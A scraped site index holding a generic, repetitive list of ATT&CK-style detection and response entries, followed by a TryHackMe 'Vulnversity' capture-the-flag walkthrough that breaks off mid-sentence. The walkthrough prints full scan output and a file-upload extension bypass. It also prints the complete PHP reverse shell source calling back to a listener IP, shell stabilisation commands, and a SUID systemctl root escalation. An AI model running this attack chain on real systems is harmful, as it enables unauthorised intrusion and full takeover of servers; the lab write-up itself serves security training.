13. Credential Access # Detecting Credential Dumping:\nTechnique: Using tools like Mimikatz to extract passwords and hashes from memory. Detection: Monitor for unusual process activity and access to sensitive processes like LSASS. Response: Block identified credential dumping attempts and implement endpoint security solutions. Detecting Keylogging:\nTechnique: Using keyloggers to capture keystrokes and obtain credentials. Detection: Monitor for unusual process activity and use endpoint security solutions. Response: Block identified keyloggers and implement strong security policies. Detecting Credential Harvesting:\nTechnique: Using phishing or other methods to obtain credentials. Detection: Monitor for unusual login attempts and use endpoint security solutions. Response: Block identified credential harvesting attempts and implement strong authentication policies. Detecting Password Spraying:\nTechnique: Using a single password against multiple accounts to gain access. Detection: Monitor for unusual login attempts and use endpoint security solutions. Response: Block identified password spraying attempts and implement strong password policies. Detecting Brute Force Attacks:\nTechnique: Repeatedly trying different passwords to gain access. Detection: Monitor for unusual login attempts and use endpoint security solutions. Response: Block identified brute force attempts and implement strong authentication policies. Detecting Pass-the-Hash Attacks:\nTechnique: Using stolen hash values to authenticate without knowing the actual password. Detection: Monitor for unusual authentication attempts and use endpoint security solutions. Response: Block identified pass-the-hash attempts and implement strong authentication policies. Detecting Pass-the-Ticket Attacks:\nTechnique: Using stolen Kerberos tickets to authenticate. Detection: Monitor for unusual Kerberos ticket activity and use endpoint security solutions. Response: Block identified pass-the-ticket attempts and implement strong authentication policies. Detecting Credential Reuse:\nTechnique: Using stolen credentials to gain unauthorized access. Detection: Monitor for unusual login attempts and use endpoint security solutions. Response: Block identified credential reuse attempts and implement strong authentication policies. 14. Lateral Movement # Detecting Remote Desktop Protocol (RDP) Usage:\nTechnique: Using RDP to move laterally within the network. Detection: Monitor for unusual RDP activity and use endpoint security solutions. Response: Block identified malicious RDP activity and implement strong RDP usage policies. Detecting SMB Relay Attacks:\nTechnique: Using the Server Message Block (SMB) protocol to relay authentication requests. Detection: Monitor for unusual SMB activity and use endpoint security solutions. Response: Block identified malicious SMB activity and implement strong SMB usage policies. Detecting Remote File Copy:\nTechnique: Copying files remotely to facilitate lateral movement. Detection: Monitor for unusual file copy activity and use endpoint security solutions. Response: Block identified malicious file copy activity and implement strong file copy policies. Detecting Windows Management Instrumentation (WMI) Usage:\nTechnique: Using WMI to execute commands on remote systems. Detection: Monitor for unusual WMI activity and use endpoint security solutions. Response: Block identified malicious WMI activity and implement strong WMI usage policies. Detecting PowerShell Remoting:\nTechnique: Using PowerShell to execute commands on remote systems. Detection: Monitor for unusual PowerShell remoting activity and use endpoint security solutions. Response: Block identified malicious PowerShell remoting activity and implement strong PowerShell remoting policies. Detecting Pass-the-Hash Attacks:\nTechnique: Using stolen hash values to authenticate without knowing the actual password. Detection: Monitor for unusual authentication attempts and use endpoint security solutions. Response: Block identified pass-the-hash attempts and implement strong authentication policies. Detecting Pass-the-Ticket Attacks:\nTechnique: Using stolen Kerberos tickets to authenticate. Detection: Monitor for unusual Kerberos ticket activity and use endpoint security solutions. Response: Block identified pass-the-ticket attempts and implement strong authentication policies. Detecting Credential Reuse:\nTechnique: Using stolen credentials to gain unauthorized access. Detection: Monitor for unusual login attempts and use endpoint security solutions. Response: Block identified credential reuse attempts and implement strong authentication policies. 15. Collection # Detecting Data Staging:\nTechnique: Preparing data for exfiltration. Detection: Monitor for unusual data staging activity and use endpoint security solutions. Response: Block identified data staging attempts and implement strong data staging policies. Detecting Data Archiving:\nTechnique: Archiving data to facilitate exfiltration. Detection: Monitor for unusual data archiving activity and use endpoint security solutions. Response: Block identified data archiving attempts and implement strong data archiving policies. Detecting Data Compression:\nTechnique: Compressing data to facilitate exfiltration. Detection: Monitor for unusual data compression activity and use endpoint security solutions. Response: Block identified data compression attempts and implement strong data compression policies. Detecting Data Encryption:\nTechnique: Encrypting data to facilitate exfiltration. Detection: Monitor for unusual data encryption activity and use endpoint security solutions. Response: Block identified data encryption attempts and implement strong data encryption policies. Detecting Data Transfer:\nTechnique: Transferring data to a remote location to facilitate exfiltration. Detection: Monitor for unusual data transfer activity and use endpoint security solutions. Response: Block identified data transfer attempts and implement strong data transfer policies. Detecting Data Collection Tools:\nTechnique: Using tools to collect data for exfiltration. - Detection: Monitor for unusual data collection tool activity and use endpoint security solutions. - Response: Block identified data collection tools and implement strong data collection policies.\nDetecting Data Collection Scripts:\nTechnique: Using scripts to collect data for exfiltration. Detection: Monitor for unusual data collection script activity and use endpoint security solutions. Response: Block identified data collection scripts and implement strong data collection policies. Detecting Data Collection from Network Shares:\nTechnique: Collecting data from network shares for exfiltration. Detection: Monitor for unusual data collection from network shares activity and use endpoint security solutions. Response: Block identified data collection from network shares and implement strong data collection policies. 16. Exfiltration # Data Exfiltration via HTTP/HTTPS:\nTechnique: Using HTTP or HTTPS to exfiltrate data. Detection: Monitor for unusual HTTP/HTTPS traffic and use data loss prevention (DLP) solutions. Response: Block identified data exfiltration attempts and implement strong HTTP/HTTPS usage policies. Data Exfiltration via FTP:\nTechnique: Using FTP to exfiltrate data. Detection: Monitor for unusual FTP traffic and use data loss prevention (DLP) solutions. Response: Block identified data exfiltration attempts and implement strong FTP usage policies. Data Exfiltration via Email:\nTechnique: Using email to exfiltrate data. Detection: Monitor for unusual email activity and use data loss prevention (DLP) solutions. Response: Block identified data exfiltration attempts and implement strong email usage policies. Data Exfiltration via Removable Media:\nTechnique: Using removable media to exfiltrate data. Detection: Monitor for unusual removable media activity and use data loss prevention (DLP) solutions. Response: Block identified data exfiltration attempts and implement strong removable media usage policies. Data Exfiltration via Cloud Storage:\nTechnique: Using cloud storage to exfiltrate data. Detection: Monitor for unusual cloud storage activity and use data loss prevention (DLP) solutions. Response: Block identified data exfiltration attempts and implement strong cloud storage usage policies. Data Exfiltration via DNS:\nTechnique: Using DNS to exfiltrate data. Detection: Monitor for unusual DNS activity and use data loss prevention (DLP) solutions. Response: Block identified data exfiltration attempts and implement strong DNS usage policies. Data Exfiltration via P2P Networks:\nTechnique: Using peer-to-peer networks to exfiltrate data. Detection: Monitor for unusual P2P network activity and use data loss prevention (DLP) solutions. Response: Block identified data exfiltration attempts and implement strong P2P network usage policies. Data Exfiltration via Custom Protocols:\nTechnique: Using custom protocols to exfiltrate data. Detection: Monitor for unusual custom protocol activity and use data loss prevention (DLP) solutions. Response: Block identified data exfiltration attempts and implement strong custom protocol usage policies. 17. Impact # Detecting Data Destruction:\nTechnique: Destroying data to cause harm. Detection: Monitor for unusual data deletion activity and use endpoint security solutions. Response: Block identified data destruction attempts and implement strong data deletion policies. Detecting Data Corruption:\nTechnique: Corrupting data to cause harm. Detection: Monitor for unusual data corruption activity and use endpoint security solutions. Response: Block identified data corruption attempts and implement strong data corruption policies. Detecting Data Encryption for Ransom:\nTechnique: Encrypting data and demanding ransom for decryption. Detection: Monitor for unusual data encryption activity and use endpoint security solutions. Response: Block identified data encryption attempts and implement strong data encryption policies. Detecting Service Disruption:\nTechnique: Disrupting services to cause harm. Detection: Monitor for unusual service disruption activity and use endpoint security solutions. Response: Block identified service disruption attempts and implement strong service disruption policies. Detecting System Reboot:\nTechnique: Rebooting systems to cause disruption. Detection: Monitor for unusual system reboot activity and use endpoint security solutions. Response: Block identified system reboot attempts and implement strong system reboot policies. Detecting System Shutdown:\nTechnique: Shutting down systems to cause disruption. Detection: Monitor for unusual system shutdown activity and use endpoint security solutions. Response: Block identified system shutdown attempts and implement strong system shutdown policies. Detecting Service Sabotage:\nTechnique: Sabotaging services to cause harm. Detection: Monitor for unusual service sabotage activity and use endpoint security solutions. Response: Block identified service sabotage attempts and implement strong service sabotage policies. Detecting Financial Impact:\nTechnique: Causing financial harm through cyber attacks. Detection: Monitor for unusual financial activity and use endpoint security solutions. Response: Block identified financial impact attempts and implement strong financial security policies. 18. Objectives # Detecting Strategic Data Theft:\nTechnique: Stealing data to achieve strategic objectives. Detection: Monitor for unusual data access activity and use endpoint security solutions. Response: Block identified data theft attempts and implement strong data access policies. Detecting Intellectual Property Theft:\nTechnique: Stealing intellectual property to gain competitive advantage. Detection: Monitor for unusual data access activity and use endpoint security solutions. Response: Block identified intellectual property theft attempts and implement strong data access policies. Detecting Industrial Espionage:\nTechnique: Conducting espionage to gain industrial advantage. Detection: Monitor for unusual data access activity and use endpoint security solutions. Response: Block identified industrial espionage attempts and implement strong data access policies. Detecting Financial Theft:\nTechnique: Stealing financial data to gain monetary advantage. Detection: Monitor for unusual financial activity and use endpoint security solutions. Response: Block identified financial theft attempts and implement strong financial security policies. Detecting Political Espionage:\nTechnique: Conducting espionage to gain political advantage. Detection: Monitor for unusual data access activity and use endpoint security solutions. Response: Block identified political espionage attempts and implement strong data access policies. Detecting Military Espionage:\nTechnique: Conducting espionage to gain military advantage. Detection: Monitor for unusual data access activity and use endpoint security solutions. Response: Block identified military espionage attempts and implement strong data access policies. Detecting Personal Data Theft:\nTechnique: Stealing personal data to gain advantage. Detection: Monitor for unusual data access activity and use endpoint security solutions. Response: Block identified personal data theft attempts and implement strong data access policies. Detecting Trade Secret Theft:\nTechnique: Stealing trade secrets to gain competitive advantage. Detection: Monitor for unusual data access activity and use endpoint security solutions. Response: Block identified trade secret theft attempts and implement strong data access policies. "},{"id":1,"href":"/docs/TryHackMe/Vulnversity/","title":"Vulnversity","section":"Try Hack Me","content":" Learn about active recon, web app attacks and privilege escalation.\nhttps://tryhackme.com/r/room/vulnversity\nScanning # Scan the machine for open ports using nmap.\n❯ rustscan -a 10.10.118.9 -- -sVC .----. .-. .-. .----..---. .----. .---. .--. .-. .-. | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| | | .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ | `-\u0026#39; `-\u0026#39;`-----\u0026#39;`----\u0026#39; `-\u0026#39; `----\u0026#39; `---\u0026#39; `-\u0026#39; `-\u0026#39;`-\u0026#39; `-\u0026#39; The Modern Day Port Scanner. ________________________________________ : http://discord.skerritt.blog : : https://github.com/RustScan/RustScan : -------------------------------------- Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan [~] The config file is expected to be at \u0026#34;/root/.rustscan.toml\u0026#34; [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers [!] Your file limit is very small, which negatively impacts RustScan\u0026#39;s speed. Use the Docker image, or up the Ulimit with \u0026#39;--ulimit 5000\u0026#39;. Open 10.10.118.9:21 Open 10.10.118.9:22 Open 10.10.118.9:139 Open 10.10.118.9:445 Open 10.10.118.9:3128 Open 10.10.118.9:3333 [~] Starting Script(s) [\u0026gt;] Running script \u0026#34;nmap -vvv -p {{port}} {{ip}} -sVC\u0026#34; on ip 10.10.118.9 Depending on the complexity of the script, results may take some time to appear. [~] Starting Nmap 7.93 ( https://nmap.org ) at 2024-05-24 03:31 EDT NSE: Loaded 155 scripts for scanning. NSE: Script Pre-scanning. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 03:31 Completed NSE at 03:31, 0.00s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 03:31 Completed NSE at 03:31, 0.00s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 03:31 Completed NSE at 03:31, 0.00s elapsed Initiating Ping Scan at 03:31 Scanning 10.10.118.9 [4 ports] Completed Ping Scan at 03:31, 0.15s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 03:31 Completed Parallel DNS resolution of 1 host. at 03:31, 0.04s elapsed DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0] Initiating SYN Stealth Scan at 03:31 Scanning 10.10.118.9 [6 ports] Discovered open port 21/tcp on 10.10.118.9 Discovered open port 445/tcp on 10.10.118.9 Discovered open port 22/tcp on 10.10.118.9 Discovered open port 139/tcp on 10.10.118.9 Discovered open port 3333/tcp on 10.10.118.9 Discovered open port 3128/tcp on 10.10.118.9 Completed SYN Stealth Scan at 03:31, 0.16s elapsed (6 total ports) Initiating Service scan at 03:31 Scanning 6 services on 10.10.118.9 Completed Service scan at 03:32, 21.88s elapsed (6 services on 1 host) NSE: Script scanning 10.10.118.9. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 03:32 Completed NSE at 03:32, 4.91s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 03:32 Completed NSE at 03:32, 0.85s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 03:32 Completed NSE at 03:32, 0.00s elapsed Nmap scan report for 10.10.118.9 Host is up, received echo-reply ttl 61 (0.12s latency). Scanned at 2024-05-24 03:31:47 EDT for 28s PORT STATE SERVICE REASON VERSION 21/tcp open ftp syn-ack ttl 61 vsftpd 3.0.3 22/tcp open ssh syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 5a4ffcb8c8761cb5851cacb286411c5a (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDYQExoU9R0VCGoQW6bOwg0U7ILtmfBQ3x/rdK8uuSM/fEH80hgG81Xpqu52siXQXOn1hpppYs7rpZN+KdwAYYDmnxSPVwkj2yXT9hJ/fFAmge3vk0Gt5Kd8q3CdcLjgMcc8V4b8v6UpYemIgWFOkYTzji7ZPrTNlo4HbDgY5/F9evC9VaWgfnyiasyAT6aio4hecn0Sg1Ag35NTGnbgrMmDqk6hfxIBqjqyYLPgJ4V1QrqeqMrvyc6k1/XgsR7dlugmqXyICiXu03zz7lNUf6vuWT707yDi9wEdLE6Hmah78f+xDYUP7iNA0raxi2H++XQjktPqjKGQzJHemtPY5bn | 256 ac9dec44610c28850088e968e9d0cb3d (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHCK2yd1f39AlLoIZFsvpSlRlzyO1wjBoVy8NvMp4/6Db2TJNwcUNNFjYQRd5EhxNnP+oLvOTofBlF/n0ms6SwE= | 256 3050cb705a865722cb52d93634dca558 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGqh93OTpuL32KRVEn9zL/Ybk+5mAsT/81axilYUUvUB 139/tcp open netbios-ssn syn-ack ttl 61 Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn syn-ack ttl 61 Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP) 3128/tcp open http-proxy syn-ack ttl 61 Squid http proxy 3.5.12 |_http-server-header: squid/3.5.12 |_http-title: ERROR: The requested URL could not be retrieved 3333/tcp open http syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu)) |_http-title: Vuln University |_http-server-header: Apache/2.4.18 (Ubuntu) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_clock-skew: mean: 1h20m00s, deviation: 2h18m34s, median: 0s | smb-os-discovery: | OS: Windows 6.1 (Samba 4.3.11-Ubuntu) | Computer name: vulnuniversity | NetBIOS computer name: VULNUNIVERSITY\\x00 | Domain name: \\x00 | FQDN: vulnuniversity |_ System time: 2024-05-24T03:32:10-04:00 | smb2-time: | date: 2024-05-24T07:32:10 |_ start_date: N/A | p2p-conficker: | Checking for Conficker.C or higher... | Check 1 (port 11877/tcp): CLEAN (Couldn\u0026#39;t connect) | Check 2 (port 64173/tcp): CLEAN (Couldn\u0026#39;t connect) | Check 3 (port 15194/udp): CLEAN (Failed to receive data) | Check 4 (port 35923/udp): CLEAN (Failed to receive data) |_ 0/4 checks are positive: Host is CLEAN or ports are blocked | nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 000000000000 (Xerox) | Names: | VULNUNIVERSITY\u0026lt;00\u0026gt; Flags: \u0026lt;unique\u0026gt;\u0026lt;active\u0026gt; | VULNUNIVERSITY\u0026lt;03\u0026gt; Flags: \u0026lt;unique\u0026gt;\u0026lt;active\u0026gt; | VULNUNIVERSITY\u0026lt;20\u0026gt; Flags: \u0026lt;unique\u0026gt;\u0026lt;active\u0026gt; | \\x01\\x02__MSBROWSE__\\x02\u0026lt;01\u0026gt; Flags: \u0026lt;group\u0026gt;\u0026lt;active\u0026gt; | WORKGROUP\u0026lt;00\u0026gt; Flags: \u0026lt;group\u0026gt;\u0026lt;active\u0026gt; | WORKGROUP\u0026lt;1d\u0026gt; Flags: \u0026lt;unique\u0026gt;\u0026lt;active\u0026gt; | WORKGROUP\u0026lt;1e\u0026gt; Flags: \u0026lt;group\u0026gt;\u0026lt;active\u0026gt; | Statistics: | 0000000000000000000000000000000000 | 0000000000000000000000000000000000 |_ 0000000000000000000000000000 | smb2-security-mode: | 311: |_ Message signing enabled but not required | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) NSE: Script Post-scanning. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 03:32 Completed NSE at 03:32, 0.00s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 03:32 Completed NSE at 03:32, 0.00s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 03:32 Completed NSE at 03:32, 0.00s elapsed Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 28.35 seconds Raw packets sent: 10 (416B) | Rcvd: 7 (292B) There was an apache server running on port 3333.\nEnumeration # Let\u0026rsquo;s fuzz for directories using gobuster.\n❯ gobuster dir -w ~/tools/wordlists/directory-list-2.3-small.txt -u http://10.10.118.9:3333/ =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.118.9:3333/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /root/tools/wordlists/directory-list-2.3-small.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /images (Status: 301) [Size: 322] [--\u0026gt; http://10.10.118.9:3333/images/] /css (Status: 301) [Size: 319] [--\u0026gt; http://10.10.118.9:3333/css/] /js (Status: 301) [Size: 318] [--\u0026gt; http://10.10.118.9:3333/js/] /fonts (Status: 301) [Size: 321] [--\u0026gt; http://10.10.118.9:3333/fonts/] /internal (Status: 301) [Size: 324] [--\u0026gt; http://10.10.118.9:3333/internal/] =============================================================== Finished =============================================================== There is a path /internal/ with a file upload functionality.\nExploitation # Upon viewing it, there was a file upload functionality. Using this we can upload a malicious php file to get a reverse shell.\nCopy the php file from the following resource and edit the ip address to tun0 ip address.\nhttps://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php\nLet us try to upload a php file and see if it\u0026rsquo;s accepting the file type. The file type php is not accepted.\nStart Burp Suite and configure the proxy in the browser.\nUpload the php file that we just created and capture the request in Burp.\nPOST /internal/index.php HTTP/1.1 Host: 10.10.118.9:3333 User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Content-Type: multipart/form-data; boundary=---------------------------7905088481562265153553597258 Content-Length: 5845 Origin: http://10.10.118.9:3333 Connection: close Referer: http://10.10.118.9:3333/internal/ Upgrade-Insecure-Requests: 1 -----------------------------7905088481562265153553597258 Content-Disposition: form-data; name=\u0026#34;file\u0026#34;; filename=\u0026#34;php-reverse-shell.php\u0026#34; Content-Type: application/x-php \u0026lt;?php // php-reverse-shell - A Reverse Shell implementation in PHP // Copyright (C) 2007 pentestmonkey@pentestmonkey.net // // This tool may be used for legal purposes only. Users take full responsibility // for any actions performed using this tool. The author accepts no liability // for damage caused by this tool. If these terms are not acceptable to you, then // do not use this tool. // // In all other respects the GPL version 2 applies: // // This program is free software; you can redistribute it and/or modify // it under the terms of the GNU General Public License version 2 as // published by the Free Software Foundation. // // This program is distributed in the hope that it will be useful, // but WITHOUT ANY WARRANTY; without even the implied warranty of // MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the // GNU General Public License for more details. // // You should have received a copy of the GNU General Public License along // with this program; if not, write to the Free Software Foundation, Inc., // 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA. // // This tool may be used for legal purposes only. Users take full responsibility // for any actions performed using this tool. If these terms are not acceptable to // you, then do not use this tool. // // You are encouraged to send comments, improvements or suggestions to // me at pentestmonkey@pentestmonkey.net // // Description // ----------- // This script will make an outbound TCP connection to a hardcoded IP and port. // The recipient will be given a shell running as the current user (apache normally). // // Limitations // ----------- // proc_open and stream_set_blocking require PHP version 4.3+, or 5+ // Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows. // Some compile-time options are needed for daemonisation (like pcntl, posix). These are rarely available. // // Usage // ----- // See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck. set_time_limit (0); $VERSION = \u0026#34;1.0\u0026#34;; $ip = \u0026#39;10.6.10.164\u0026#39;; // CHANGE THIS $port = 4444; // CHANGE THIS $chunk_size = 1400; $write_a = null; $error_a = null; $shell = \u0026#39;uname -a; w; id; /bin/sh -i\u0026#39;; $daemon = 0; $debug = 0; // // Daemonise ourself if possible to avoid zombies later // // pcntl_fork is hardly ever available, but will allow us to daemonise // our php process and avoid zombies. Worth a try... if (function_exists(\u0026#39;pcntl_fork\u0026#39;)) { // Fork and have the parent process exit $pid = pcntl_fork(); if ($pid == -1) { printit(\u0026#34;ERROR: Can\u0026#39;t fork\u0026#34;); exit(1); } if ($pid) { exit(0); // Parent exits } // Make the current process a session leader // Will only succeed if we forked if (posix_setsid() == -1) { printit(\u0026#34;Error: Can\u0026#39;t setsid()\u0026#34;); exit(1); } $daemon = 1; } else { printit(\u0026#34;WARNING: Failed to daemonise. This is quite common and not fatal.\u0026#34;); } // Change to a safe directory chdir(\u0026#34;/\u0026#34;); // Remove any umask we inherited umask(0); // // Do the reverse shell... // // Open reverse connection $sock = fsockopen($ip, $port, $errno, $errstr, 30); if (!$sock) { printit(\u0026#34;$errstr ($errno)\u0026#34;); exit(1); } // Spawn shell process $descriptorspec = array( 0 =\u0026gt; array(\u0026#34;pipe\u0026#34;, \u0026#34;r\u0026#34;), // stdin is a pipe that the child will read from 1 =\u0026gt; array(\u0026#34;pipe\u0026#34;, \u0026#34;w\u0026#34;), // stdout is a pipe that the child will write to 2 =\u0026gt; array(\u0026#34;pipe\u0026#34;, \u0026#34;w\u0026#34;) // stderr is a pipe that the child will write to ); $process = proc_open($shell, $descriptorspec, $pipes); if (!is_resource($process)) { printit(\u0026#34;ERROR: Can\u0026#39;t spawn shell\u0026#34;); exit(1); } // Set everything to non-blocking // Reason: Occsionally reads will block, even though stream_select tells us they won\u0026#39;t stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0); stream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0); printit(\u0026#34;Successfully opened reverse shell to $ip:$port\u0026#34;); while (1) { // Check for end of TCP connection if (feof($sock)) { printit(\u0026#34;ERROR: Shell connection terminated\u0026#34;); break; } // Check for end of STDOUT if (feof($pipes[1])) { printit(\u0026#34;ERROR: Shell process terminated\u0026#34;); break; } // Wait until a command is end down $sock, or some // command output is available on STDOUT or STDERR $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); // If we can read from the TCP socket, send // data to process\u0026#39;s STDIN if (in_array($sock, $read_a)) { if ($debug) printit(\u0026#34;SOCK READ\u0026#34;); $input = fread($sock, $chunk_size); if ($debug) printit(\u0026#34;SOCK: $input\u0026#34;); fwrite($pipes[0], $input); } // If we can read from the process\u0026#39;s STDOUT // send data down tcp connection if (in_array($pipes[1], $read_a)) { if ($debug) printit(\u0026#34;STDOUT READ\u0026#34;); $input = fread($pipes[1], $chunk_size); if ($debug) printit(\u0026#34;STDOUT: $input\u0026#34;); fwrite($sock, $input); } // If we can read from the process\u0026#39;s STDERR // send data down tcp connection if (in_array($pipes[2], $read_a)) { if ($debug) printit(\u0026#34;STDERR READ\u0026#34;); $input = fread($pipes[2], $chunk_size); if ($debug) printit(\u0026#34;STDERR: $input\u0026#34;); fwrite($sock, $input); } } fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process); // Like print, but does nothing if we\u0026#39;ve daemonised ourself // (I can\u0026#39;t figure out how to redirect STDOUT like a proper daemon) function printit ($string) { if (!$daemon) { print \u0026#34;$string\\n\u0026#34;; } } ?\u0026gt; -----------------------------7905088481562265153553597258 Content-Disposition: form-data; name=\u0026#34;submit\u0026#34; Submit -----------------------------7905088481562265153553597258-- Send the request to the repeater and check the response. The response includes that php extension is not alllowed.\n\u0026lt;body\u0026gt; \u0026lt;form action=\u0026#34;index.php\u0026#34; method=\u0026#34;post\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt; \u0026lt;h3\u0026gt;Upload\u0026lt;/h3\u0026gt;\u0026lt;br /\u0026gt; \u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;file\u0026#34; id=\u0026#34;file\u0026#34;\u0026gt; \u0026lt;input class=\u0026#34;btn btn-primary\u0026#34; type=\u0026#34;submit\u0026#34; value=\u0026#34;Submit\u0026#34; name=\u0026#34;submit\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; Extension not allowed \u0026lt;/body\u0026gt; Send the request to intruder and in payload positions, select attack type as sniper and add ‘§’ to the file extension php.\nContent-Disposition: form-data; name=\u0026#34;file\u0026#34;; filename=\u0026#34;php-reverse-shell.§php§\u0026#34; Content-Type: application/x-php Go to payload options, add the extensions php, php3, php4. php5, phtml and start the attack.\nAfter the attack was completed, we can see the results. In that sort by length and the length for phtml is 723 and for the rest of them 737. Also, for confirming that it was the correct file type allowed, check the response.\nNow, edit the file extension of the php file we created to phtml.\nUpload the file, and in another terminal start a netcat listener.\nnc -lnvp 4444 The file is uploaded into the uploads directory. In the browser, access the file we uploaded which will be present in the path.\nhttp://10.10.118.9:3333/internal/uploads/php_reverse_shell.phtml\nAfter file is accessed, we get a reverse shell.\n❯ nc -lnvp 4444 listening on [any] 4444 ... connect to [10.6.10.164] from (UNKNOWN) [10.10.118.9] 60722 Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux 17:43:51 up 1:23, 0 users, load average: 0.00, 0.00, 0.00 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/sh: 0: can\u0026#39;t access tty; job control turned off $ Now that we\u0026rsquo;ve got a shell, we need to stabilize the shell as it is unstable.\nRun the command to spawn a tty shell.\npython -c \u0026#34;import pty; pty.spawn(\u0026#39;/bin/bash\u0026#39;)\u0026#34; Now hit ctrl+z to background it.\nCtrl + Z Set the terminal to raw mode, disable echoing of input characters and foreground the process.\nstty raw -echo \u0026amp;\u0026amp; fg Set the terminal variable.\nexport TERM=xterm $ python -c \u0026#34;import pty; pty.spawn(\u0026#39;/bin/bash\u0026#39;)\u0026#34; www-data@vulnuniversity:/$ ^Z [1] + 29347 suspended nc -lnvp 4444 ❯ stty raw -echo \u0026amp;\u0026amp; fg [1] + 29347 continued nc -lnvp 4444 www-data@vulnuniversity:/$ export TERM=xterm www-data@vulnuniversity:/$ Privilege Escalation # Now run to find SUID files with root permission.\nfind / -user root -perm -4000 -exec ls -ldb {} \\; -rwsr-xr-x 1 root root 40128 May 16 2017 /bin/su -rwsr-xr-x 1 root root 142032 Jan 28 2017 /bin/ntfs-3g -rwsr-xr-x 1 root root 40152 May 16 2018 /bin/mount -rwsr-xr-x 1 root root 44680 May 7 2014 /bin/ping6 -rwsr-xr-x 1 root root 27608 May 16 2018 /bin/umount -rwsr-xr-x 1 root root 659856 Feb 13 2019 /bin/systemctl -rwsr-xr-x 1 root root 44168 May 7 2014 /bin/ping -rwsr-xr-x 1 root root 30800 Jul 12 2016 /bin/fusermount We found some interesting files. Of them, /bin/systemctl is running as root.\nWe will follow as mentioned in the following resource to get elevated priveleges.\nhttps://gtfobins.github.io/gtfobins/systemctl/#suid.\nWe will try to follow that to get the root shell. Instead of using the default one /bin/sh -c \u0026quot;id \u0026gt; /tmp/output\u0026quot;, we need to get a shell. So, we use this /bin/sh -c \u0026quot;chmod +s /bin/bash\u0026quot; instead of that.\nTF=$(mktemp).service echo \u0026#39;[Service] Type=oneshot ExecStart=/bin/sh -c \u0026#34;chmod +s /bin/bash\u0026#34; [Install] WantedBy=multi-user.target\u0026#39; \u0026gt; $TF ./systemctl link $TF ./systemctl enable --now $TF www-data@vulnuniversity:/$ TF=$(mktemp).service www-data@vulnuniversity:/$ echo \u0026#39;[Service] \u0026gt; Type=oneshot \u0026gt; ExecStart=/bin/sh -c \u0026#34;chmod +s /bin/bash\u0026#34; \u0026gt; [Install] \u0026gt; WantedBy=multi-user.target\u0026#39; \u0026gt; $TF www-data@vulnuniversity:/$ /bin/systemctl link $TF Created symlink from /etc/systemd/system/tmp.UnoAvXlPum.service to /tmp/tmp.UnoAvXlPum.service. www-data@vulnuniversity:/$ /bin/systemctl enable --now $TF Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.UnoAvXlPum.service to /tmp/tmp.UnoAvXlPum.service. www-data@vulnuniversity:/$ bash -p bash-4.3# id uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data) bash-4.3# cd /root bash-4.3# ls root.txt bash-4.3# We are 